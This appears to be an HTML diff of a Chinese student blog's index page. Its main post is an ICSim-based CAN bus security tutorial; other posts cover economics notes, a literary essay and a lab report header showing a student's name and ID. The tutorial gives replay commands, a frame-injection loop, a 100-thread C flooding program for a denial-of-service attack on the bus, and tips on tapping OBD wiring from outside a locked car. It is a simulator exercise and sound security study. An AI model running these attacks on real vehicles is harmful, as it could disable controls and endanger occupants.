@@ -198,6 +198,789 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/" class="post-title-link" itemprop="url">浅谈车联网CAN总线安全（基于ICSim</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-24 22:48:17" itemprop="dateCreated datePublished" datetime="2024-04-24T22:48:17+08:00">2024-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-26 12:19:54" itemprop="dateModified" datetime="2024-04-26T12:19:54+08:00">2024-04-26</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我个人对车联网安全算是倾慕已久（bushi，想想吧，超巨型遥控车，属实有点酷炫。从另一个方面看，因物理意义上的人是确确实实坐在车里的，这和传统的虚拟战场攻防区别开，赋予了车联网安全特别的意义。<br />
+现代汽车产业发展迅速，传统汽车再满足不了人民日益增长的美好生活需要（最政治正确的一集。早期的车辆是没有电气系统的，发动机以及相关机械功能的工作都是纯机械驱动；没有空调，没有灯。但这样汽车永远只会是代步工具而无法满足驾驶员的驾驶体验。于是抛除掉基本的运载功能，各种子系统在不断增加，其中革命性的发展在20年代中期——电子控制单元（ECU）的出现，现代车辆已有数百个ECU，负责转向、加速、制动等等功能。1986年，德国公司Bosch开发出CAN总线来连接ECU。而在此之前，车载通信系统是通过点对点的布线系统实现的。随着车载电子元件越来越多，这种通信系统变得愈发笨重，而且维护费用非常昂贵。<br />
+对于CAN总线的安全性，由于这是一种低级协议，所以不存在内在的安全功能，所以其网络数据可以被任意截取。在大多数应用中，应用程序需要部署自己的安全机制，例如认证传入命令或网络上某些设备的存在。若不执行适当的安全措施，其他人可能设法在总线上插入消息。尽管一些安全关键功能（如修改固件，编程键或控制防抱死制动）存在密码，但这些系统并未普遍实施，并且密钥对的数量有限。<br />
+总的来说，CAN总线控制各种ECU怎么配合，即他们之间的通信。由此可以想象，如果有人能操控你的CAN总线进行命令控制，那是多么可怕的一件事。</p>
+<h1 id="防御措施">防御措施</h1>
+<p>车载加密技术：车载加密技术可以对车辆明文数据信息进行保护，有效防止攻击者利用传输信道窃取或破坏传输信息，进而保证数据传输的完整性和机密性，避免数据泄露的安全风险。Aminifar
+等提出了一种基于迭代分组密码的对称加密方法，并设置了机密保护与开销之间的权衡机制，以最大限度地提高机密性，同时保证实时性的要求。
+车载防火墙技术：防火墙技术可以对网络流量进行监控，根据事先制定的安全策略对数据流量进行管控。Luo等为车载网络设计一个安全网关，基于威胁分析定义了车载网关的安全要求，提出将安全通信、密钥主控和防火墙作为保护汽车网关的安全机制，安全通信机制主要包含消息身份验证和数据加密。
+车载入侵检测技术：相较于静态的车载入侵防御系统（intrusion prevention
+system，IPS），车载入侵检测系统（intrusion detection
+system，IDS）可以对网络流量进行监控，是一种在不影响网络性能前提下的主动防御手段，主要有基于异常IDS、基于签名IDS、基于规范IDS、基于混合IDS、基于指纹
+IDS、基于参数监控 IDS、基于信息熵IDS 和基于机器学习 IDS。其中，基于异常
+IDS为业内常用的入侵检测方法，将实时数据与正常行为数据进行比对，利用训练好的模型分析结果和常规值的偏差与阈值之间的关系，定位安全风险。
+车载安全审计技术：利用车载终端记录的访问日志进行审计和监管，也是车载终端系统安全防护的重要手段之一。Checkoway
+等通过实验验证了审计系统会在发现异常或攻击事件时启动处理程序，降低潜在攻击的威胁。常见的安全审计方法有基于数理统计的安全审计、基于特征匹配的安全审计以及基于预测感知的安全审计。
+车载网络安全认证技术：车载网络安全认证技术可以增强车载系统的安全性。Jo
+等提出了一种Mauth-CAN认证方法，利用ECU与验证器共享密钥，验证器可以安全有效地为ECU分配种子值，进而规避由ECU发起伪造攻击的安全风险。</p>
+<h1 id="仿真环境与基本操作">仿真环境与基本操作</h1>
+<h2 id="icsim">ICSim</h2>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;setup_vcan.sh # 初始化，每次重启后都要重新运行
+.&#x2F;icsim vcan0 # 仪表界面
+.&#x2F;controls vcan0 # 控制界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>其中启动 setup_vcan.sh 主要功能是加载CAN和vCAN（virtual controller
+area network）网络模块。并创建名为vcan0的网络设备打开连接。<br />
+| 功能 | 按键 | | --------------- | ----------------- | | 加速 |
+上方向键 | | 左转向 | 左方向键 | | 右转向 | 右方向键 | | 开/关左车门前锁
+| 右/左shift + A | | 开/关右车门前锁 | 右/左shift + B | |
+开/关左车门后锁 | 右/左shift + X | | 开/关右车门后锁 | 右/左shift + y |
+| 开启所有车门锁 | 左shift + 右shift | | 关闭所有车门锁 | 右shift +
+左shift |</p>
+<h2 id="can-utils">can-utils</h2>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install can-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这是一个用于控制与 CAN 总线通信的工具集合，具体包括如下：<br />
+cansend：用于向 CAN 总线发送单个 CAN
+帧。可以指定帧的标识符、数据和其他参数。<br />
+candump：用于监听 CAN
+总线上的数据帧，并将接收到的帧显示在终端上。可用于实时监测 CAN
+总线的数据流。<br />
+canplayer：用于回放记录在文件中的 CAN 数据帧。可以模拟之前捕获的 CAN
+数据，对系统进行测试和验证。<br />
+cangen：用于生成随机的 CAN 数据帧，用于测试和模拟不同的 CAN
+数据场景。<br />
+cansniffer：用于监视 CAN 总线上的数据帧，并将其显示在终端上。与 candump
+不同的是，cansniffer
+可以提供更详细的信息，如错误检测和计数器统计等。<br />
+canbusload：用于测试 CAN 总线的负载容量。通过生成大量的 CAN
+数据帧，可以评估 CAN 总线的性能和稳定性。</p>
+<h2 id="socketcand">socketcand</h2>
+<p>用于在Linux系统上实现CAN（Controller Area
+Network）总线的通信。它提供了一个简单且灵活的接口，使用户能够通过套接字（sockets）与CAN总线进行通信。我们需要用这个工具来让SavvyCAN跟CAN总线通信。</p>
+<pre class="line-numbers language-none"><code class="language-none">下载socketcand
+
+git clone https:&#x2F;&#x2F;github.com&#x2F;linux-can&#x2F;socketcand.git
+cd socketcand
+
+获取缺少的文件
+
+wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dschanoeh&#x2F;socketcand&#x2F;master&#x2F;config.h.in
+
+编译安装
+
+autoconf
+.&#x2F;configure
+make clean
+make
+sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="savvycan">SavvyCAN</h2>
+<p>SavvyCAN是一个基于多个QT平台的C++程序，主要用于CAN数据的逆向分析和捕获。
+<pre class="line-numbers language-none"><code class="language-none"># 直接下载二进制文件进行使用
+wget https:&#x2F;&#x2F;github.com&#x2F;collin80&#x2F;SavvyCAN&#x2F;releases&#x2F;download&#x2F;continuous&#x2F;SavvyCAN-1999da8-x86_64.AppImage
+chmod 777 SavvyCAN-1999da8-x86_64.AppImage
+.&#x2F;SavvyCAN-044fea3-x86_64.AppImage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> 需先安装<a
+target="_blank" rel="noopener" href="https://download.qt.io/archive/qt/5.14/5.14.2/">Qt5环境</a>，注意安装时不能只安装Qt
+creator,全部下下来内存还挺大的，大约五六个G，注意留好空间。<br />
+然后在 Connection-&gt;Open Connection Window-&gt;Add New Device
+Connection 中选择 QT SerialBus Devices，将 SerialBus Devices 选择为
+socketcan，将port选择为虚拟端口vcan0，就可以开始捕捉与过滤了。</p>
+<h2 id="wireshark">WireShark</h2>
+<p>无处不在</p>
+<h1 id="如何物理意义上接入can网络">如何物理意义上接入CAN网络</h1>
+<p>通过OBD可以直接访问CAN。车上诊断系统（On-Board
+Diagnostics），是一种装置于车中以监控车辆运行状态与回报异常的系统，可于车辆的子系统出现问题时，产生故障代码和提醒讯号通知车主和车厂诊断维修。
+示例位置：<a
+target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1xh411Q7AP/?spm_id_from=333.337.search-card.all.click&amp;vd_source=925702a604089f3c4965c6447751f6ed">江铃车系的OBD诊断接口</a>
+得知车辆的大概布线的话，可以从锁着的车外卸下铁皮，从外部接入OBD的布线。</p>
+<h1 id="重放攻击">重放攻击</h1>
+<p>重放攻击(Replay
+attack)是一种网络攻击，指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。从这个解释上理解，加密可以有效防止会话劫持，但是却防止不了重放攻击。重放攻击任何网络通讯过程中都可能发生。<br />
+在仿真模拟中，可利用can-utils中的candump与canplayer工具来实现数据包的捕捉与重放。
+<pre class="line-numbers language-none"><code class="language-none">candump -l vcan0 # 将数据包存储到log中
+canplayer -I 文件名.log # 进行重放攻击
+&#96;&#96;&#96;  
+危害举例：车辆跟充电桩之间的通信部分也是CAN通信，如果CAN流量能够进行重放，没有一定的防御机制，那么攻击者可能可以通过这种方式进行恶意扣费等操作，即捕捉你付费的数据包重复发送。  
+加速正常重放只能加速一下，写一个python程序：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre> import os import time</p>
+<p>while True: os.system("cansend vcan0 244#0000003894") time.sleep(1)
+<pre class="line-numbers language-none"><code class="language-none">
+# 消息逆向
+
+虽然流量重放能够让我们触发特定的操作，但实际上我们不知道是哪一帧能够触发这个操作，这就需要我们对消息进行逆向。根据抓取的CAN数据还原其外在的体现，具体分析指令对应的功能。CAN 总线命令的语义通常可分为两类：（1） 控制，它操作车辆的物理部件，如解锁车门和启动发动机;（2） 诊断，用于查询车辆的数据（如速度和温度）。对于每个语义含义，都有一个对 CAN 总线命令的一对一映射。例如，对于丰田普锐斯，CAN总线命令标识符&quot;0x750&quot;是指主体，&quot;0x7C4&quot;用于空调。
+这里随便举个例子来说明其具体格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre> (1714014624.483285) vcan0 19B#000000000000 # 对应 (时间戳)
+can接口 仲裁ID#数据 # 仲裁ID的数字越低，在网络上的优先级就越高。
+<pre class="line-numbers language-none"><code class="language-none">分析数据可以根据log文件慢慢排查，就是删删删（二分法）不停运行看到底是哪行负责。第一次获取log文件手慢了直接获取了一万六千多行...找不了一点，后面手快缩短到五千行，但也二分了19次才找到。  
+快一点的方法就是利用cansniffer工具看动态的log，即操作一下看看是哪些数据在变化，但咱属实眼神不好...（Bushi。就不放静态的图了，因为动态的看一下还蛮明显的，以开车门举例，可以明显发现进行开车门操作时多了一行数据。  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> cansniffer -c vcan0 <pre class="line-numbers language-none"><code class="language-none">另外，SavvyCAN中的sniffer要更好找一些，开启notch过滤直接世界都清净了。  
+
+# 基于CAN总线协议仲裁机制的DOS攻击
+
+一句话概括CAN总线的机制：CAN总线是一种基于“先来后到、无损仲裁”机制、多主（无主）结构、具有帧ID、应用数据最多8个字节、采用差分电平的国际标准现场总线。细细说来，“先来后到”是说总线空闲时，任何一个CAN节点都可以发送数据，谁先来谁先发，避免内卷，从我做起，哦耶。“无损仲裁”是说两个节点同时发的时候，则比较数据帧ID部分来决定谁先发送，ID小的先发，ID大的自动退出。而退出后数据也不会丢失，而是等待下一个空闲期再尝试发送。“多主”指每个节点的地位相对来说是平等，都可以主动发起数据。    
+这里可能会发现这个机制和p-坚持CSMA有些类似，但又稍有不同。其一，CSMA碰了再改，CAN先比再发。当多个节点监听到信道为空闲时，CSMA可能同时发送数据而导致碰撞，然后等待随机时间再发送；CAN中尝试发送前会先比较。其二，CSMA如果发生碰撞，数据可能丢失；CAN即使发生碰撞，数据也不会丢失。另外，简要分析一下这样设计的原因，CSMA粗糙一些，目的是网络中的节点共享通信信道，主要希望减少碰撞而增加网络的吞吐量和效率；CAN精细一些，目的是提供可靠的实时通信，主要希望保证数据的准确性。
+我们先找到两个低优先级的操作，为了做对比实验<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> cansend vcan0
+19B#00000E000000 # 开车门 cansend vcan0 19B#00000F000000 # 关车门 #
+找一个高于他们的，这里使用的左转向灯 cansend vcan0 188#01000000 #
+开左转向灯 <pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+
+void* send_message(void* arg) &#123;
+    while (1) &#123;
+        system(&quot;cansend vcan0 188#01000000&quot;);
+    &#125;
+
+    return NULL;
+&#125;
+
+int main() &#123;
+    pthread_t threads[100];
+
+
+    for (int i &#x3D; 0; i &lt; 100; i++) &#123;
+        pthread_create(&amp;threads[i], NULL, send_message, NULL);
+    &#125;
+
+    while (1) &#123;
+        sleep(1); 
+    &#125;
+
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这段代码的作用是创建了100个线程，每个线程都会不断地向CAN总线发送相同的消息，模拟了多个节点同时发送数据的情况。
+<pre class="line-numbers language-none"><code class="language-none">gcc -o attack main.c -pthread<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+编译为attack可执行文件后执行，发现左转灯一直在开。随后利用模拟器进行开关车门的操作，会发现好几次之后才成功。所以只能是造成部分CAN数据干扰，不能百分百干扰，不过还是可以感觉到是有变化的，部分数据会产生丢失，造成对应的指令没有执行成功。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/MySQL-Lab-2-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/MySQL-Lab-2-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">MySQL Lab_2 函数与存储过程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-18 18:31:15" itemprop="dateCreated datePublished" datetime="2024-04-18T18:31:15+08:00">2024-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-21 22:42:07" itemprop="dateModified" datetime="2024-04-21T22:42:07+08:00">2024-04-21</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1
+id="华东师范大学软件工程学院实践报告">华东师范大学软件工程学院实践报告</h1>
+<table>
+<colgroup>
+<col style="width: 44%" />
+<col style="width: 29%" />
+<col style="width: 26%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>实验课程：数据库系统实践</th>
+<th>姓名：刘佳奇</th>
+<th>学号：10225101455</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>实验名称：Lab2 函数与存储过程</td>
+<td>实验日期：2024/4/18</td>
+<td>指导老师：姚俊杰</td>
+</tr>
+</tbody>
+</table>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/MySQL-Lab-2-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A6%99%E8%B6%A3%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%B9%8B%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A6%99%E8%B6%A3%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%B9%8B%E8%B7%AF/" class="post-title-link" itemprop="url">从零开始的妙趣经济学之路</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-04-18 18:00:35 / 修改时间：20:20:07" itemprop="dateCreated datePublished" datetime="2024-04-18T18:00:35+08:00">2024-04-18</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>963</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>故事的开始......一门伪装为通识课的妙趣经济学，实则是张牙舞爪的经济学原理。（发出尖锐的爆鸣声<br />
+那么，为了将全世界的米都收入囊中，实现海洋公主的复仇之路，Link
+Start！</p>
+<p>经济学是研究什么的？如何分配社会的稀缺资源，而非是仅仅局限于狭义的“经济”二字。</p>
+<h1 id="经济学十大原理">经济学十大原理</h1>
+<p>原理9：当政府发行了过多货币时，物价上升。<br />
+原理10：社会面临通货膨胀和失业之间的短期权衡取舍。这个原理可以用来解释商业周期，即经济活动（就业机会、生产活动）中出现的波动。注意是短期，从长期来看，货币数量只影响通货膨胀（原理9），失业和货币数量无关。</p>
+<h1 id="供给与需求的市场力量">供给与需求的市场力量</h1>
+<p>市场是什么？市场是由某种产品或服务的买方与卖方组成的一个群体。市场的类型有很多，如完全竞争市场（产品相同，买卖双方人数众多，且都不能影响市场价格，大家都必须接受市场上确定的价格，都能买到或出售任意数量货物，不会因为你要买一百个保温壶保温壶就涨价了，相当于一种理想模型），垄断市场（市场上只有一个卖方，价格他说了算，比如专利版权），寡头垄断市场（市场内卖方数量少且并非总是积极的竞争，如可口和百事），垄断竞争市场（市场内许多卖家且有差异化产品，可以自己定价，如电子游戏，餐馆米其林一星二星三星，是有一点子market_power在的）。<br />
+经济学中的需求与我们认知中的区别是关注了你的购买力，定义为买方愿意购买且<strong>能够</strong>购买的产品的数量。所以比方说如果冰淇淋白送你的需求量是十二个，涨价到三元你的需求量变为0个。此为个人需求，市场需求则为市场内个人需求对应求和。
+对于需求曲线，重点区分需求曲线移动与沿着需求曲线移动，只有当价格变化时，如税率，才会表现为沿着，其余比如买方数量变化等都是直接使需求曲线移动。<br />
+<pre class="line-numbers language-none"><code class="language-none">假如手机壳价格上升，对手机的需求会有什么影响？ E
+A. 沿着需求曲线上移
+B. 沿着需求曲线下移
+C. 需求曲线左移
+D. 需求曲线右移
+E. 以上都不是<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这里这道题明显是个坑，谁买手机之前会先查查手机壳涨没涨价？他们并不是诸如电脑和软件、羽毛球与羽毛球拍之类的互补品。<br />
+经济学中的“供给”同样与我们认知中的略有差异，定义为卖方愿意并且能够出售的产品的数量。区分需求与供给，还以冰淇淋为例子，冰淇淋供给量越多，价格越会上升（卖家越愿意卖，注意定义对卖家意愿的注重，如果市场上冰淇淋免费送，谁还去当大怨种做慈善...）。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E7%A5%9E%E7%A7%98%E7%9A%84%E2%80%9C%E9%80%A0%E7%89%A9%E2%80%9D-%E2%80%94%E2%80%94%E7%9F%9B%E7%9B%BE%E3%80%8A%E5%88%9B%E9%80%A0%E3%80%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E7%A5%9E%E7%A7%98%E7%9A%84%E2%80%9C%E9%80%A0%E7%89%A9%E2%80%9D-%E2%80%94%E2%80%94%E7%9F%9B%E7%9B%BE%E3%80%8A%E5%88%9B%E9%80%A0%E3%80%8B/" class="post-title-link" itemprop="url">神秘的“造物” ——矛盾《创造》</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-04-17 18:01:50 / 修改时间：19:56:48" itemprop="dateCreated datePublished" datetime="2024-04-17T18:01:50+08:00">2024-04-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%BA%E6%96%87%E6%83%85%E6%80%80/" itemprop="url" rel="index"><span itemprop="name">人文情怀</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>852</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这篇小说联合茅盾个人的经历投射出当时一种典型的时代故事，传承至今演变为脍炙人口的“养成系”。<br />
+一、作者态度的展示与引导<br />
+读小说时通过作者的用词便可以辨别作者的态度，茅盾并不是一个吝惜于表露自己态度的人。如本小说中使用“保守思想，指桑骂槐”等来形容可看出作者对君实的讽刺。
+娴娴说君实说话时的神气使她难受（间接引语）
+君实说话时的神气使她难受（自由间接引语），这样既可以看为娴娴的态度，又可以看为作者的态度。詹姆斯伍德：我们同时拥有全知视角和限知视角。很直接的一个结果：会引导读者的态度，产生与描述的对象没有任何隔膜的错觉。
+二、“创造”、“恋爱”与“革命”
+“创造”，“新”，“变化”在那个新文化时代被赋予别样价值，是毋庸置疑的褒义词，相应得“旧”非常不好，如果回到那个年代谈“怀旧”，一准会被疯狂鄙视。<br />
+在那个年代，“革命家恋爱”模式（光荣的“流行病”）被推崇，二者互相辉映。“创造”、“恋爱”与“革命”三个词是互文的关系，相互包含，爱情中总是包含了一种创造的预期。在小说中，君实便含了这样一种理想，但最后他二者都失败了，他所创造的娴娴脱离了他的控制。他监控了整个创造的过程，“我真不知道是怎么一回事，我不相信书里的真理会有两个”，类似于数学公式与化学实验，但人要复杂的多。他渴望着双重的收获，但最后他失去了爱情与革命的动力。“黄道士烧符念咒的时候，唯恐鬼不来，等到鬼当真来了，他又怕的跟什么似的，心里抱怨那鬼太狞恶，不是他的理想的鬼了”，娴娴却觉君实所谓数学公式只是装神弄鬼。“君实轻轻的拉下了娴娴的手，细珍珠给他的手指一种冷而滑的感觉。他的心灵突然一震”一个自己相识多年很熟悉的人，在某个瞬间自己却觉得对方陌生无比，刻画了这样一个场景。最熟悉的东西突然变成最陌生的东西，给人的恐惧感很强烈（一些恐怖片让家人变成阿飘）uncanny，形容熟悉突然感到陌生，弗洛伊德在心理学上有具体的解释。
+弗兰肯斯坦：人造人，非常丑陋，创造他的科学家被吓跑。娴娴：也可以看作是由知识的碎片来拼凑
+参考资料： 1. <a
+target="_blank" rel="noopener" href="https://zzrb.zynews.cn/html/2010-08/26/content_222358.htm">茅盾：创造一个爱人和同志</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E2%80%9C%E9%80%83%E7%A6%BB%E5%A4%A7%E5%9F%8E%E5%B8%82%E2%80%9Dor%E2%80%9C%E9%80%83%E5%9B%9E%E5%A4%A7%E5%9F%8E%E5%B8%82%E2%80%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E2%80%9C%E9%80%83%E7%A6%BB%E5%A4%A7%E5%9F%8E%E5%B8%82%E2%80%9Dor%E2%80%9C%E9%80%83%E5%9B%9E%E5%A4%A7%E5%9F%8E%E5%B8%82%E2%80%9D/" class="post-title-link" itemprop="url">“逃离大城市”or“逃回大城市”</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
